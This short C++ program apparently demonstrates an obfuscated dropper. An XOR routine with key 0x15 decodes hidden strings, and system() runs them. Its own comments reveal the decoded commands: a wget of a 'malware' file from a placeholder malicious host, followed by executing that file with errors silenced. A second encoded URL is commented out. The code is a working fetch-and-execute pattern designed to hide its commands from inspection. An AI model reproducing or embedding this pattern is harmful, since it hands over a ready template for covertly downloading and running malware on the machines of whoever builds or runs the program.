#include <stdio.h>
#include <string.h>
#include <stdlib.h>

char g_szTemp[1024];

/*
char* encode(char* s)
{
	strcpy( g_szTemp, s );
		
	for( int i = 0; i < 200; i++ ) {
		if( g_szTemp[i] != 0 ) {
			g_szTemp[i] ^= 0x15;
		}
	}
	return g_szTemp;
}
*/

extern "C" char* decode(char* s)
{
	strcpy( g_szTemp, s );
		
	for( int i = 0; i < 200; i++ ) {
		if( g_szTemp[i] != 0 ) {
			g_szTemp[i] ^= 0x15;
		}
	}
	return g_szTemp;
}

int main()
{
	//brpa5}aaef/::cpglwtq`gyJ\JTXJXTY\V\Z@F:xtybtgp5'+5:qpc:{`yy
	//;:xtybtgp5'+5:qpc:{`yy

	//brpa5}aaef/::bbb;pc|yJtqqgpff;vzx:xtybtgp5'+5:qpc:{`yy
	//;:xtybtgp5'+5:qpc:{`yy

	
	//system(decode("zjhw#kwwsv=22zzz1hylobdgguhvv1frp2pdozduh"));
	//system(decode("pdozduh"));
	
	system(decode("brpa5}aaef/::cpglwtq`gyJ\JTXJXTY\V\Z@F:xtybtgp5'+5:qpc:{`yy"));
	system(decode(";:xtybtgp5'+5:qpc:{`yy"));
	
	//printf("%s\n", encode("wget https://verybadurl_I_AM_MALICIOUS/malware 2> /dev/null"));
	//printf("%s\n", encode("./malware 2> /dev/null"));
	
	
	return 0;
}
